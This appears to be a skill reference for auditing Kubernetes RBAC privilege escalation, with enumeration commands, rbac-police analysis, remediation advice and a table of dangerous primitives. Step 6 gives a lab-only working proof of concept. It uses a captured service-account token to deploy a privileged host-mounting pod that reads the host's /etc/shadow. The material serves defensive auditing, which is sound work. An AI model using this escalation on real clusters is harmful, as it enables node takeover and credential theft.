# auditing-kubernetes-rbac-privilege-escalation — 详细参考（由 SKILL.md 拆分）

# Who can perform each dangerous action across the cluster?
kubectl who-can create pods
kubectl who-can '*' '*'                      # wildcard god-mode holders
kubectl who-can get secrets
kubectl who-can list secrets
kubectl who-can create pods/exec
kubectl who-can impersonate users
kubectl who-can create serviceaccounts/token
kubectl who-can update clusterrolebindings   # bind-style escalation

# grep the raw dump for escalate/bind/impersonate verbs and wildcards
grep -nE 'escalate|impersonate|"\*"|- bind' rbac-dump.yaml
```

### Step 4: Run Automated Escalation-Path Analysis with rbac-police

rbac-police evaluates Rego policies over a cluster snapshot to surface principals that can escalate to cluster-admin and the exact path.

```bash
# Run all built-in escalation checks (needs a kubeconfig with read access)
./rbac-police eval ./lib/policies/

# Only the privilege-escalation policy, severe findings as JSON
./rbac-police eval ./lib/policies/can_escalate.rego -f json -o findings.json

# Collect a snapshot first (offline analysis / air-gapped review)
./rbac-police collect -o cluster-snapshot.json
./rbac-police eval ./lib/policies/ --collect-results cluster-snapshot.json
```

### Step 5: Trace Pods to Over-Privileged Service Accounts

A finding only matters if a reachable workload mounts that token.

```bash
# Map every pod to its service account
kubectl get pods --all-namespaces \
  -o custom-columns='NS:.metadata.namespace,POD:.metadata.name,SA:.spec.serviceAccountName'

# Find pods that auto-mount tokens (the default) tied to risky SAs
kubectl get pods --all-namespaces -o json | jq -r '
  .items[] | select(.spec.automountServiceAccountToken != false) |
  "\(.metadata.namespace)/\(.metadata.name) -> \(.spec.serviceAccountName // "default")"'

# rbac-lookup: what does that service account actually hold?
kubectl rbac-lookup builder --kind serviceaccount
```

### Step 6: Demonstrate an Escalation Path (Lab Only)

Example: a service account with `create pods` and access to a node can schedule a privileged pod that mounts the host filesystem.

```bash
# Using a captured token, target the API server directly
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://kubernetes.default.svc

# Confirm the dangerous right
kubectl --token="$TOKEN" --server="$APISERVER" --insecure-skip-tls-verify \
  auth can-i create pods

# Schedule a privileged host-mounting pod (proves node/host takeover)
cat <<'EOF' | kubectl --token="$TOKEN" --server="$APISERVER" \
  --insecure-skip-tls-verify apply -f -
apiVersion: v1
kind: Pod
metadata: {name: escalate-poc, namespace: default}
spec:
  containers:
  - name: x
    image: alpine
    command: ["/bin/sh","-c","cat /host/etc/shadow; sleep 1d"]
    securityContext: {privileged: true}
    volumeMounts: [{name: host, mountPath: /host}]
  volumes: [{name: host, hostPath: {path: /}}]
EOF
kubectl logs escalate-poc   # host /etc/shadow proves escalation
```

### Step 7: Report and Remediate

```bash
# Generate a least-privilege-violation summary
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | select(.roleRef.name=="cluster-admin") |
  "FINDING cluster-admin bound to: " +
  ((.subjects // []) | map(.kind+":"+.name) | join(", "))'
```

Remediation: replace wildcards with explicit verbs/resources; remove `escalate`/`bind`/`impersonate` unless required; set `automountServiceAccountToken: false` on workloads that do not call the API; scope `Role` (namespaced) over `ClusterRole` where possible; use `aggregationRule` carefully.

## Tools and Resources

| Tool | Purpose | Source |
|------|---------|--------|
| kubectl auth can-i | Authoritative live permission check (`--list`, `--as`) | https://kubernetes.io/docs/reference/access-authn-authz/authorization/ |
| rbac-police | Rego-based escalation-path analysis | https://github.com/PaloAltoNetworks/rbac-police |
| kubectl-who-can | Reverse lookup: who can do X | https://github.com/aquasecurity/kubectl-who-can |
| rakkess (access-matrix) | Verb x resource matrix per subject | https://github.com/corneliusweig/rakkess |
| rbac-lookup | Roles a subject holds | https://github.com/FairwindsOps/rbac-lookup |
| Kubernetes RBAC Good Practices | Authoritative escalation primitive list | https://kubernetes.io/docs/concepts/security/rbac-good-practices/ |

## Dangerous RBAC Primitives Reference

| Verb / Resource | Why It Is Cluster-Admin-Equivalent |
|-----------------|------------------------------------|
| `escalate` on roles | Grant self any permission |
| `bind` on clusterroles | Bind self to cluster-admin |
| `impersonate` users/groups | Act as system:masters |
| `create pods` (+ node access) | Privileged/hostPath pod -> host takeover |
| `create pods/exec`,`pods/attach` | Run code in existing pods |
| `get`/`list` secrets | Read all tokens & credentials |
| `create serviceaccounts/token` | Mint privileged tokens |
| `*`/`*` (wildcards) | Implicit super-privilege |

## Validation Criteria

- [ ] All Role/ClusterRole/Binding objects inventoried and dumped
- [ ] cluster-admin subject list enumerated
- [ ] Effective permissions enumerated per service account via `auth can-i --list`
- [ ] All dangerous-primitive holders identified (escalate/bind/impersonate/secrets/pods)
- [ ] rbac-police escalation paths reviewed
- [ ] Token-mounting pods mapped to risky service accounts
- [ ] At least one escalation path demonstrated in a lab
- [ ] Findings report with least-privilege remediation produced
- [ ] All testing stayed within authorized scope
